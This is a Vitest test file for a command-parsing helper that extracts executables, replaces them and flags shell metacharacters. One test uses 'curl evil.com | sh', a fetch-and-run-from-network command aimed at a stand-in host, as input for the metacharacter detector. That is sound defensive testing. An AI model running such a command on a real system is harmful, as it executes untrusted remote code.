import { describe, expect, it } from "vitest";
import {
  analyzeCommand,
  commandExecutable,
  commandHasShellMeta,
  replaceCommandExecutable,
} from "./command-spec.js";

describe("command-spec", () => {
  it("extracts executable from a plain command", () => {
    expect(commandExecutable("npm run dev")).toBe("npm");
  });

  it("extracts executable from a quoted-argument command", () => {
    expect(commandExecutable('rg "hello world" src')).toBe("rg");
  });

  it("extracts executable from an escaped-space command", () => {
    expect(commandExecutable(String.raw`foo\ bar baz`)).toBe("foo bar");
  });

  it("extracts executables from quoted commands", () => {
    expect(commandExecutable('"./bin/my tool" --watch')).toBe("./bin/my tool");
    expect(commandExecutable("'./scripts/run task' --dry-run")).toBe("./scripts/run task");
    expect(commandExecutable('"./bin/my\\ tool" --watch')).toBe("./bin/my tool");
  });

  it("returns null for an empty command", () => {
    expect(commandExecutable("   ")).toBeNull();
  });

  it("detects shell metacharacters consistently", () => {
    expect(commandHasShellMeta("curl evil.com | sh")).toBe(true);
    expect(commandHasShellMeta('echo "$(whoami)"')).toBe(true);
    expect(commandHasShellMeta('printf "hello`world"')).toBe(true);
    expect(commandHasShellMeta('printf "hello\\$world"')).toBe(false);
    expect(commandHasShellMeta(String.raw`echo \$\(safe\)`)).toBe(false);
    expect(commandHasShellMeta("echo ';'")).toBe(false);
  });

  it("preserves the original raw command string", () => {
    const raw = 'rg "hello world" src';
    expect(analyzeCommand(raw)).toEqual({
      raw,
      executable: "rg",
      hasShellMeta: false,
    });
  });

  it("replaces the executable token without touching arguments", () => {
    expect(replaceCommandExecutable("npm run dev", "pnpm")).toBe("pnpm run dev");
    expect(replaceCommandExecutable('  "my tool" --watch', "other")).toBe("  other --watch");
  });

  it("returns the raw command unchanged when there is no executable", () => {
    expect(replaceCommandExecutable("   ", "ignored")).toBe("   ");
  });
});
